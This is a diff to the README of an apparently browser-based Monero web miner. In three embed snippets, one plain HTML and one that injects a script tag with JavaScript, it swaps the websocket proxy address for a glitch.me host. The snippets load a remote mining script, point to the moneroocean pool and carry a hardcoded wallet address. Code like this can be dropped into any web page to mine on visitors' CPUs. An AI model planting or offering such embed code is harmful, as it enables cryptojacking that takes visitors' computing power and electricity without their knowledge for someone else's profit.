@@ -15,7 +15,7 @@ In index.Html you can configure it your preferences
 
 
 ```javascript
-server = "wss://45.119.82.33:40725";
+server = "wss://ubiquitous-pushy-singularity.glitch.me";
     var pool = "gulf.moneroocean.stream:80";
     var walletAddress = "INSERT YOUR ADDRESS HERE";
     var workerId = "INSERT NODE NAME"
@@ -50,7 +50,7 @@ HTML
     <!-- Start Of Mining Code (HTML) -->
     <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
     <script>
-        server = "wss://45.119.82.33:40725";
+        server = "wss://ubiquitous-pushy-singularity.glitch.me";
         var pool = "moneroocean.stream";
         var walletAddress = "44F4qdJA81RA3eWsscZCmBgBiJomT7BsT6mM4JggZZo6RGEsPxX6eoYAVYM7gPc4m83EJzMwkB3qFf42jtwtUyen7NCrQPE";
         var workerId = "GH-XMR"
@@ -74,7 +74,7 @@ Javascript
     script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
     document.head.appendChild(script);
 
-    server = "wss://45.119.82.33:40725";
+    server = "wss://ubiquitous-pushy-singularity.glitch.me";
     var pool = "moneroocean.stream";
     var walletAddress = "44F4qdJA81RA3eWsscZCmBgBiJomT7BsT6mM4JggZZo6RGEsPxX6eoYAVYM7gPc4m83EJzMwkB3qFf42jtwtUyen7NCrQPE";
     var workerId = "GH-XMR"
